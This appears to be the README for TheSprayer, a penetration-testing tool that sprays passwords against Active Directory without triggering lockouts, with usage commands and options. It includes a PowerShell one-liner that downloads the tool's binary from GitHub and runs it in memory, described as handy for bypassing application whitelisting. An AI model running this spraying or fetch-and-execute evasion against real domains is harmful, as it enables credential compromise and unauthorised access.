# TheSprayer
TheSprayer is a cross-platform tool designed to help penetration testers spray passwords against an Active Directory domain WITHOUT locking out accounts.  

## Quick Start
There's several ways to run it, each way will required you to update the parameters.
The tool requires a domain name, DC IP/Hostname and a Username+Password combo for the domain in order to enumerate users and password policies.

You can grab a release and run it directly:
```
TheSprayer.exe -d windomain.local -s 192.168.38.102 -u Administrator -p Password1 -i Passwords.txt
```

or you can run it via reflection without touching disk: (Also handy for bypassing app whitelisting!)
```
$sprayer=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/coj337/TheSprayer/raw/master/TheSprayer/binaries/Releases/TheSprayer.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [TheSprayer.Program]::Main(@('-d','windomain.local','-s','192.168.32.102','-u','Administrator','-p','Password1'))
TODO: Update the link
```

# Options
```
-d, --Domain          Required. The Active Directory domain (e.g. windomain.local)
-s, --Server          Required. The IP or hostname of a domain controller
-u, --Username        Required. Username for domain user to enumerate policies
-p, --Password        Required. Password for domain user to enumerate policies
-i, --PasswordFile    Required. A file containing a line delimited list of passwords to try
-o, --OutFile         File to output found credentials
--help                Display help screen
--version             Display version information
```